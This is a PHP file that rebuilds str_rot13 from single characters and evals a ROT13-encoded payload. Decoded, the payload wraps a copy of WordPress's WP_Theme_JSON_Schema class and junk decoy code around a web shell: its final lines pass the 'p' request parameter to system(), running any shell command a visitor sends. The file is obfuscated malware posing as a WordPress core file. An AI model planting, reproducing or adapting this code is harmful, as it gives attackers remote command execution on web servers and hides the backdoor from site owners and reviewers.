<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_Gurzr_WFBA_Fpurzn pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gurzr
 * @fvapr 5.9.0
 */

/**
 * Pynff gung zvtengrf n tvira gurzr.wfba fgehpgher gb gur yngrfg fpurzn.
 *
 * Guvf pynff vf sbe vagreany pber hfntr naq vf abg fhccbfrq gb or hfrq ol rkgraqref (cyhtvaf naq/be gurzrf).
 * Guvf vf n ybj-yriry NCV gung znl arrq gb qb oernxvat punatrf. Cyrnfr,
 * hfr trg_tybony_frggvatf, trg_tybony_fglyrf, naq trg_tybony_fglyrfurrg vafgrnq.
 *
 * @fvapr 5.9.0
 * @npprff cevingr
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Gurzr_WFBA_Fpurzn {

	/**
	 * Zncf byq cebcregvrf gb gurve arj ybpngvba jvguva gur fpurzn'f frggvatf.
	 * Guvf jvyy or nccyvrq ng obgu gur qrsnhygf naq vaqvivqhny oybpx yriryf.
	 */
	pbafg I1_GB_I2_ERANZRQ_CNGUF = neenl(
		'obeqre.phfgbzEnqvhf'         => 'obeqre.enqvhf',
		'fcnpvat.phfgbzZnetva'        => 'fcnpvat.znetva',
		'fcnpvat.phfgbzCnqqvat'       => 'fcnpvat.cnqqvat',
		'glcbtencul.phfgbzYvarUrvtug' => 'glcbtencul.yvarUrvtug',
	);

	/**
	 * Shapgvba gung zvtengrf n tvira gurzr.wfba fgehpgher gb gur ynfg irefvba.
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.6.0 Zvtengr hc gb i3 naq nqq $bevtva cnenzrgre.
	 *
	 * @cnenz neenl $gurzr_wfba Gur fgehpgher gb zvtengr.
	 * @cnenz fgevat $bevtva    Bcgvbany. Jung fbhepr bs qngn guvf bowrpg ercerfragf.
	 *                          Bar bs 'oybpxf', 'qrsnhyg', 'gurzr', be 'phfgbz'. Qrsnhyg 'gurzr'.
	 * @erghea neenl Gur fgehpgher va gur ynfg irefvba.
	 */
	choyvp fgngvp shapgvba zvtengr( $gurzr_wfba, $bevtva = 'gurzr' ) {
		vs ( ! vffrg( $gurzr_wfba['irefvba'] ) ) {
			$gurzr_wfba = neenl(
				'irefvba' => JC_Gurzr_WFBA::YNGRFG_FPURZN,
			);
		}

		// Zvtengr rnpu irefvba va beqre fgnegvat jvgu gur pheerag irefvba.
		fjvgpu ( $gurzr_wfba['irefvba'] ) {
			pnfr 1:
				$gurzr_wfba = frys::zvtengr_i1_gb_i2( $gurzr_wfba );
				// Qryvorengr snyy guebhtu. Bapr zvtengrq gb i2, nyfb zvtengr gb i3.
			pnfr 2:
				$gurzr_wfba = frys::zvtengr_i2_gb_i3( $gurzr_wfba, $bevtva );
		}

		erghea $gurzr_wfba;
	}

	/**
	 * Erzbirf gur phfgbz cersvkrf sbe n srj cebcregvrf
	 * gung jrer cneg bs i1:
	 *
	 * 'obeqre.phfgbzEnqvhf'         => 'obeqre.enqvhf',
	 * 'fcnpvat.phfgbzZnetva'        => 'fcnpvat.znetva',
	 * 'fcnpvat.phfgbzCnqqvat'       => 'fcnpvat.cnqqvat',
	 * 'glcbtencul.phfgbzYvarUrvtug' => 'glcbtencul.yvarUrvtug',
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $byq Qngn gb zvtengr.
	 *
	 * @erghea neenl Qngn jvgubhg gur phfgbz cersvkrf.
	 */
	cevingr fgngvp shapgvba zvtengr_i1_gb_i2( $byq ) {
		// Pbcl rirelguvat.
		$arj = $byq;

		// Birejevgr gur guvatf gung punatrq.
		vs ( vffrg( $byq['frggvatf'] ) ) {
			$arj['frggvatf'] = frys::eranzr_cnguf( $byq['frggvatf'], frys::I1_GB_I2_ERANZRQ_CNGUF );
		}

		// Frg gur arj irefvba.
		$arj['irefvba'] = 2;

		erghea $arj;
	}

	/**
	 * Zvtengrf sebz i2 gb i3.
	 *
	 * - Frgf frggvatf.glcbtencul.qrsnhygSbagFvmrf gb snyfr vs frggvatf.glcbtencul.sbagFvmrf ner qrsvarq.
	 * - Frgf frggvatf.fcnpvat.qrsnhygFcnpvatFvmrf gb snyfr vs frggvatf.fcnpvat.fcnpvatFvmrf ner qrsvarq.
	 * - Ceriragf frggvatf.fcnpvat.fcnpvatFvmrf sebz zretvat jvgu frggvatf.fcnpvat.fcnpvatFpnyr ol
	 *   hafrggvat fcnpvatFpnyr jura fcnpvatFvmrf ner qrsvarq.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz neenl $byq     Qngn gb zvtengr.
	 * @cnenz fgevat $bevtva Jung fbhepr bs qngn guvf bowrpg ercerfragf.
	 *                       Bar bs 'oybpxf', 'qrsnhyg', 'gurzr', be 'phfgbz'.
	 * @erghea neenl Qngn jvgu qrsnhygSbagFvmrf frg gb snyfr.
	 */
	cevingr fgngvp shapgvba zvtengr_i2_gb_i3( $byq, $bevtva ) {
		// Pbcl rirelguvat.
		$arj = $byq;

		// Frg gur arj irefvba.
		$arj['irefvba'] = 3;

		/*
		 * Erznvavat punatrf qb abg arrq gb or nccyvrq gb gur phfgbz bevtva,
		 * nf gurl fubhyq gnxr ba gur inyhr bs gur gurzr bevtva.
		 */
		vs ( 'phfgbz' === $bevtva ) {
			erghea $arj;
		}

		/*
		 * Rira gubhtu qrsnhygSbagFvmrf naq qrsnhygFcnpvatFvmrf ner arj
		 * frggvatf, jr arrq gb zvtengr gurz nf gurl rnpu pbageby
		 * CERFRGF_ZRGNQNGN cerirag_bireevqr inyhrf juvpu jrer cerivbhfyl
		 * uneqpbqrq gb snyfr. Guvf bayl arrqf gb unccra jura gur gurzr cebivqrf
		 * sbagFvmrf be fcnpvatFvmrf nf gurl pbhyq zngpu gur qrsnhyg barf naq
		 * nssrpg gur trarengrq PFF.
		 */
		vs ( vffrg( $byq['frggvatf']['glcbtencul']['sbagFvmrf'] ) ) {
			$arj['frggvatf']['glcbtencul']['qrsnhygSbagFvmrf'] = snyfr;
		}

		/*
		 * Fvzvyneyl gb qrsnhygSbagFvmrf, jr arrq gb zvtengr qrsnhygFcnpvatFvmrf
		 * nf vg pbagebyf gur CERFRGF_ZRGNQNGN cerirag_bireevqr juvpu jnf
		 * cerivbhfyl uneqpbqrq gb snyfr. Guvf bayl arrqf gb unccra jura gur
		 * gurzr cebivqrq fcnpvat fvmrf ivn fcnpvatFvmrf be fcnpvatFpnyr.
		 */
		vs (
			vffrg( $byq['frggvatf']['fcnpvat']['fcnpvatFvmrf'] ) ||
			vffrg( $byq['frggvatf']['fcnpvat']['fcnpvatFpnyr'] )
		) {
			$arj['frggvatf']['fcnpvat']['qrsnhygFcnpvatFvmrf'] = snyfr;
		}

		/*
		 * Va i3 fcnpvatFvmrf vf zretrq jvgu gur trarengrq fcnpvatFpnyr fvmrf
		 * vafgrnq bs pbzcyrgryl ercynpvat gurz. Gur i3 orunivbe vf jung jnf
		 * qbphzragrq sbe gur i2 fpurzn, ohg gur pbqr arire npghnyyl qvq jbex
		 * gung jnl. Vafgrnq bs fhecevfvat hfref jvgu n orunivbe punatr gjb
		 * lrnef nsgre gur snpg ng gur fnzr gvzr nf n i3 hcqngr vf vagebqhprq,
		 * jr'yy pbagvahr hfvat gur \"ohttrq\" orunivbe sbe i2 gurzrf. Naq gerng
		 * gur \"oht svk\" nf n oernxvat punatr sbe i3.
		 */
		vs ( vffrg( $byq['frggvatf']['fcnpvat']['fcnpvatFvmrf'] ) ) {
			hafrg( $arj['frggvatf']['fcnpvat']['fcnpvatFpnyr'] );
		}

		erghea $arj;
	}

	/**
	 * Cebprffrf gur frggvatf fhogerr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $frggvatf        Neenl gb cebprff.
	 * @cnenz neenl $cnguf_gb_eranzr Cnguf gb eranzr.
	 *
	 * @erghea neenl Gur frggvatf va gur arj sbezng.
	 */
	cevingr fgngvp shapgvba eranzr_cnguf( $frggvatf, $cnguf_gb_eranzr ) {
		$arj_frggvatf = $frggvatf;

		// Cebprff nal eranzrq/zbirq cnguf jvguva qrsnhyg frggvatf.
		frys::eranzr_frggvatf( $arj_frggvatf, $cnguf_gb_eranzr );

		// Cebprff vaqvivqhny oybpx frggvatf.
		vs ( vffrg( $arj_frggvatf['oybpxf'] ) && vf_neenl( $arj_frggvatf['oybpxf'] ) ) {
			sbernpu ( $arj_frggvatf['oybpxf'] nf &$oybpx_frggvatf ) {
				frys::eranzr_frggvatf( $oybpx_frggvatf, $cnguf_gb_eranzr );
			}
		}

		erghea $arj_frggvatf;
	}

	/**
	 * Cebprffrf n frggvatf neenl, eranzvat be zbivat cebcregvrf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $frggvatf        Ersrerapr gb frggvatf rvgure qrsnhygf be na vaqvivqhny oybpx'f.
	 * @cnenz neenl $cnguf_gb_eranzr Cnguf gb eranzr.
	 */
	cevingr fgngvp shapgvba eranzr_frggvatf( &$frggvatf, $cnguf_gb_eranzr ) {
		sbernpu ( $cnguf_gb_eranzr nf $bevtvany => $eranzrq ) {
			$bevtvany_cngu = rkcybqr( '.', $bevtvany );
			$eranzrq_cngu  = rkcybqr( '.', $eranzrq );
			$pheerag_inyhr = _jc_neenl_trg( $frggvatf, $bevtvany_cngu, ahyy );

			vs ( ahyy !== $pheerag_inyhr ) {
				_jc_neenl_frg( $frggvatf, $eranzrq_cngu, $pheerag_inyhr );
				frys::hafrg_frggvat_ol_cngu( $frggvatf, $bevtvany_cngu );
			}
		}
	}

	/**
	 * Erzbirf n cebcregl sebz jvguva gur cebivqrq frggvatf ol vgf cngu.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $frggvatf Ersrerapr gb gur pheerag frggvatf neenl.
	 * @cnenz neenl $cngu Cngu gb gur cebcregl gb or erzbirq.
	 */
	cevingr fgngvp shapgvba hafrg_frggvat_ol_cngu( &$frggvatf, $cngu ) {
		$gzc_frggvatf = &$frggvatf;
		$ynfg_xrl     = neenl_cbc( $cngu );
		sbernpu ( $cngu nf $xrl ) {
			$gzc_frggvatf = &$gzc_frggvatf[ $xrl ];
		}

		hafrg( $gzc_frggvatf[ $ynfg_xrl ] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>